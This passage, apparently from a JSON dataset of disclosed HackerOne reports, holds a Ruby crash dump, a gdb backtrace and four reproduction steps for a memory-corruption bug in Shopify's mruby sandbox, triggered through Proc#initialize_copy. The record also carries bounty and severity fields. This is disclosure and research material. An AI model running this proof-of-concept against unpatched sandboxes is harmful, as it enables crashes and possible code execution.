 /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n3187fdcc4198000-7fdcc419b000 r-xp 00000000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3197fdcc419b000-7fdcc439a000 ---p 00003000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3207fdcc439a000-7fdcc439b000 r--p 00002000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3217fdcc439b000-7fdcc439c000 rw-p 00003000 08:03 948452                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n3227fdcc439c000-7fdcc45ea000 r-xp 00000000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3237fdcc45ea000-7fdcc47e9000 ---p 0024e000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3247fdcc47e9000-7fdcc4805000 r--p 0024d000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3257fdcc4805000-7fdcc4811000 rw-p 00269000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n3267fdcc4811000-7fdcc4814000 rw-p 00000000 00:00 0 \n3277fdcc4814000-7fdcc487b000 r-xp 00000000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3287fdcc487b000-7fdcc4a7a000 ---p 00067000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3297fdcc4a7a000-7fdcc4a7e000 r--p 00066000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3307fdcc4a7e000-7fdcc4a85000 rw-p 0006a000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n3317fdcc4a85000-7fdcc4ad4000 r-xp 00000000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3327fdcc4ad4000-7fdcc4cd4000 ---p 0004f000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3337fdcc4cd4000-7fdcc4cd6000 r--p 0004f000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3347fdcc4cd6000-7fdcc4cd8000 rw-p 00051000 08:03 948468                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n3357fdcc4cd8000-7fdcc4cd9000 rw-p 00000000 00:00 0 \n3367fdcc4cd9000-7fdcc4cda000 r-xp 00000000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3377fdcc4cda000-7fdcc4eda000 ---p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3387fdcc4eda000-7fdcc4edb000 r--p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3397fdcc4edb000-7fdcc4edc000 rw-p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n3407fdcc4edc000-7fdcc4f0b000 r-xp 00000000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3417fdcc4f0b000-7fdcc510b000 ---p 0002f000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3427fdcc510b000-7fdcc510c000 r--p 0002f000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3437fdcc510c000-7fdcc510d000 rw-p 00030000 08:03 948450                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n3447fdcc510d000-7fdcc510e000 rw-p 00000000 00:00 0 \n3457fdcc510e000-7fdcc5111000 r-xp 00000000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3467fdcc5111000-7fdcc5310000 ---p 00003000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3477fdcc5310000-7fdcc5311000 r--p 00002000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3487fdcc5311000-7fdcc5312000 rw-p 00003000 08:03 948498                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n3497fdcc5312000-7fdcc5327000 r-xp 00000000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3507fdcc5327000-7fdcc5526000 ---p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3517fdcc5526000-7fdcc5527000 r--p 00014000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3527fdcc5527000-7fdcc5528000 rw-p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n3537fdcc5528000-7fdcc5535000 r-xp 00000000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3547fdcc5535000-7fdcc5734000 ---p 0000d000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3557fdcc5734000-7fdcc5735000 r--p 0000c000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3567fdcc5735000-7fdcc5736000 rw-p 0000d000 08:03 948479                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n3577fdcc5736000-7fdcc5738000 r-xp 00000000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3587fdcc5738000-7fdcc5937000 ---p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3597fdcc5937000-7fdcc5938000 r--p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3607fdcc5938000-7fdcc5939000 rw-p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n3617fdcc5939000-7fdcc5963000 r-xp 00000000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3627fdcc5963000-7fdcc5b62000 ---p 0002a000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3637fdcc5b62000-7fdcc5b63000 r--p 00029000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3647fdcc5b63000-7fdcc5b64000 rw-p 0002a000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n3657fdcc5b64000-7fdcc5b6a000 r-xp 00000000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3667fdcc5b6a000-7fdcc5d69000 ---p 00006000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3677fdcc5d69000-7fdcc5d6a000 r--p 00005000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3687fdcc5d6a000-7fdcc5d6b000 rw-p 00006000 08:03 948457                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n3697fdcc5d6b000-7fdcc5d6f000 r-xp 00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3707fdcc5d6f000-7fdcc5f6e000 ---p 00004000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3717fdcc5f6e000-7fdcc5f6f000 r--p 00003000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3727fdcc5f6f000-7fdcc5f70000 rw-p 00004000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n3737fdcc5f70000-7fdcc5f76000 r-xp 00000000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3747fdcc5f76000-7fdcc6175000 ---p 00006000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3757fdcc6175000-7fdcc6176000 r--p 00005000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3767fdcc6176000-7fdcc6177000 rw-p 00006000 08:03 948472                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n3777fdcc6177000-7fdcc617e000 r-xp 00000000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3787fdcc617e000-7fdcc637d000 ---p 00007000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3797fdcc637d000-7fdcc637e000 r--p 00006000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3807fdcc637e000-7fdcc637f000 rw-p 00007000 08:03 948455                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n3817fdcc637f000-7fdcc6381000 r-xp 00000000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3827fdcc6381000-7fdcc6581000 ---p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3837fdcc6581000-7fdcc6582000 r--p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3847fdcc6582000-7fdcc6583000 rw-p 00003000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n3857fdcc6583000-7fdcc6585000 r-xp 00000000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3867fdcc6585000-7fdcc6784000 ---p 00002000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3877fdcc6784000-7fdcc6785000 r--p 00001000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3887fdcc6785000-7fdcc6786000 rw-p 00002000 08:03 948512                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n3897fdcc6786000-7fdcc6887000 rw-p 00000000 00:00 0 \n3907fdcc6887000-7fdcc698a000 r-xp 00000000 08:03 935421                     /usr/lib/libm-2.24.so\n3917fdcc698a000-7fdcc6b89000 ---p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n3927fdcc6b89000-7fdcc6b8a000 r--p 00102000 08:03 935421                     /usr/lib/libm-2.24.so\n3937fdcc6b8a000-7fdcc6b8b000 rw-p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n3947fdcc6b8b000-7fdcc6b93000 r-xp 00000000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3957fdcc6b93000-7fdcc6d93000 ---p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3967fdcc6d93000-7fdcc6d94000 r--p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3977fdcc6d94000-7fdcc6d95000 rw-p 00009000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n3987fdcc6d95000-7fdcc6dc3000 rw-p 00000000 00:00 0 \n3997fdcc6dc3000-7fdcc6dc5000 r-xp 00000000 08:03 935420                     /usr/lib/libdl-2.24.so\n4007fdcc6dc5000-7fdcc6fc5000 ---p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n4017fdcc6fc5000-7fdcc6fc6000 r--p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n4027fdcc6fc6000-7fdcc6fc7000 rw-p 00003000 08:03 935420                     /usr/lib/libdl-2.24.so\n4037fdcc6fc7000-7fdcc7059000 r-xp 00000000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4047fdcc7059000-7fdcc7258000 ---p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4057fdcc7258000-7fdcc7259000 r--p 00091000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4067fdcc7259000-7fdcc725a000 rw-p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n4077fdcc725a000-7fdcc7272000 r-xp 00000000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4087fdcc7272000-7fdcc7471000 ---p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4097fdcc7471000-7fdcc7472000 r--p 00017000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4107fdcc7472000-7fdcc7473000 rw-p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n4117fdcc7473000-7fdcc7477000 rw-p 00000000 00:00 0 \n4127fdcc7477000-7fdcc760c000 r-xp 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n4137fdcc760c000-7fdcc780b000 ---p 00195000 08:03 934952                     /usr/lib/libc-2.24.so\n4147fdcc780b000-7fdcc780f000 r--p 00194000 08:03 934952                     /usr/lib/libc-2.24.so\n4157fdcc780f000-7fdcc7811000 rw-p 00198000 08:03 934952                     /usr/lib/libc-2.24.so\n4167fdcc7811000-7fdcc7815000 rw-p 00000000 00:00 0 \n4177fdcc7815000-7fdcc7a89000 r-xp 00000000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n4187fdcc7a89000-7fdcc7c88000 ---p 00274000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n4197fdcc7c88000-7fdcc7c8e000 r--p 00273000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n4207fdcc7c8e000-7fdcc7c91000 rw-p 00279000 08:03 936075                     /usr/lib/libruby.so.2.3.0\n4217fdcc7c91000-7fdcc7ca2000 rw-p 00000000 00:00 0 \n4227fdcc7ca2000-7fdcc7cc5000 r-xp 00000000 08:03 934951                     /usr/lib/ld-2.24.so\n4237fdcc7d16000-7fdcc7eae000 r--p 00000000 08:03 934978                     /usr/lib/locale/locale-archive\n4247fdcc7eae000-7fdcc7eb4000 rw-p 00000000 00:00 0 \n4257fdcc7ebe000-7fdcc7ec0000 r--s 00000000 08:03 948907                     /usr/bin/ruby\n4267fdcc7ec0000-7fdcc7ec1000 ---p 00000000 00:00 0 \n4277fdcc7ec1000-7fdcc7ec4000 rw-p 00000000 00:00 0 \n4287fdcc7ec4000-7fdcc7ec5000 r--p 00022000 08:03 934951                     /usr/lib/ld-2.24.so\n4297fdcc7ec5000-7fdcc7ec6000 rw-p 00023000 08:03 934951                     /usr/lib/ld-2.24.so\n4307fdcc7ec6000-7fdcc7ec7000 rw-p 00000000 00:00 0 \n4317ffd405b1000-7ffd40db0000 rw-p 00000000 00:00 0                          [stack]\n4327ffd40dc4000-7ffd40dc6000 r--p 00000000 00:00 0                          [vvar]\n4337ffd40dc6000-7ffd40dc8000 r-xp 00000000 00:00 0                          [vdso]\n434ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n435\n436\n437[NOTE]\n438You may have encountered a bug in the Ruby interpreter or extension libraries.\n439Bug reports are welcome.\n440For details: http://www.ruby-lang.org/bugreport.html\n441\n442[1]    10951 abort (core dumped)  bin/sandbox crashes/proc_crash.mrb\ngdb:\nCode 3.08 KiB\n1$ gdb attach `pidof ruby`\n2GNU gdb (GDB) 7.12\n3Copyright (C) 2016 Free Software Foundation, Inc.\n4License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n5This is free software: you are free to change and redistribute it.\n6There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\n7and \"show warranty\" for details.\n8This GDB was configured as \"x86_64-pc-linux-gnu\".\n9Type \"show configuration\" for configuration details.\n10For bug reporting instructions, please see:\n11<http://www.gnu.org/software/gdb/bugs/>.\n12Find the GDB manual and other documentation resources online at:\n13<http://www.gnu.org/software/gdb/documentation/>.\n14For help, type \"help\".\n15Type \"apropos word\" to search for commands related to \"word\"...\n16attach: No such file or directory.\n17Attaching to process 11091\n18[New LWP 11092]\n19[Thread debugging using libthread_db enabled]\n20Using host libthread_db library \"/usr/lib/libthread_db.so.1\".\n210x00007fb39fc594b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0\n22(gdb) c\n23Continuing.\n24[New Thread 0x7fb39ae43700 (LWP 11151)]\n25\n26Thread 3 \"ruby\" received signal SIGSEGV, Segmentation fault.\n27[Switching to Thread 0x7fb39ae43700 (LWP 11151)]\n28mrb_proc_copy (a=a@entry=0x7fb39ae4c520, b=0x7fb39ae4c490) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:144\n29144\t    a->body.irep->refcnt++;\n30(gdb) bt\n31#0  mrb_proc_copy (a=a@entry=0x7fb39ae4c520, b=0x7fb39ae4c490) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:144\n32#1  0x00007fb39c2de7be in mrb_proc_init_copy (mrb=0x7fb39ae444e0, self=...) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/proc.c:175\n33#2  0x00007fb39c2cce4f in mrb_vm_exec (mrb=mrb@entry=0x7fb39ae444e0, proc=<optimized out>, proc@entry=0x7fb39ae4c580, pc=<optimized out>)\n34    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n35#3  0x00007fb39c2d2697 in mrb_vm_run (mrb=0x7fb39ae444e0, proc=0x7fb39ae4c580, self=..., stack_keep=stack_keep@entry=0) at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n36#4  0x00007fb39c2b3613 in mruby_engine_monitored_eval (data=0x7fb39ae443e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n37#5  0x00007fb39fc53454 in start_thread () from /usr/lib/libpthread.so.0\n38#6  0x00007fb39ff517df in clone () from /usr/lib/libc.so.6\n39(gdb) info registers\n40rax            0x0\t0\n41rbx            0x7fb39ae4c520\t140409374557472\n42rcx            0x0\t0\n43rdx            0x0\t0\n44rsi            0x7fb39ae4c490\t140409374557328\n45rdi            0x7fb39ae4c520\t140409374557472\n46rbp            0x7fb39ae444e0\t0x7fb39ae444e0\n47rsp            0x7fb39ae42aa8\t0x7fb39ae42aa8\n48r8             0x7fb39ae52560\t140409374582112\n49r9             0x1\t1\n50r10            0x0\t0\n51r11            0x0\t0\n52r12            0x7fb39ae4c520\t140409374557472\n53r13            0x4d\t77\n54r14            0x7fb39ae444e0\t140409374524640\n55r15            0x7fb39ae4eb60\t140409374567264\n56rip            0x7fb39c2de605\t0x7fb39c2de605 <mrb_proc_copy+37>\n57eflags         0x10246\t[ PF ZF IF RF ]\n58cs             0x33\t51\n59ss             0x2b\t43\n60ds             0x0\t0\n61es             0x0\t0\n62fs             0x0\t0\n63gs             0x0\t0\n64(gdb) \n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 8000,
  "weaknesses": [
    "Memory Corruption - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1481944680,
  "report_url": "https://hackerone.com/reports/184857",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a Proc object with a block: `a = Proc.new do end`"
    ],
    [
      2,
      "Override the initialize method for the Proc class: `class Proc; def initialize; end; end`"
    ],
    [
      3,
      "Create a new Proc object without calling initialize: `b = Proc.new`"
    ],
    [
      4,
      "Call initialize_copy on the first Proc with the second as argument: `a.initialize_copy b`"
    ]
  ],
  "vuln_description": "The vulnerability is a crash in mruby when calling Proc::initialize_copy with a Proc instance where initialize was never run. This leads to a segmentation fault when trying to access an invalid memory location (0+OFFSET), potentially allowing for code execution or causing a denial of service.",
  "reason": "This vulnerability requires understanding of Ruby's Proc object internals and the initialization sequence. The attacker needs to know about the initialize_copy method and how to bypass normal initialization. However, the core issue is relatively straightforward once these components are understood.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}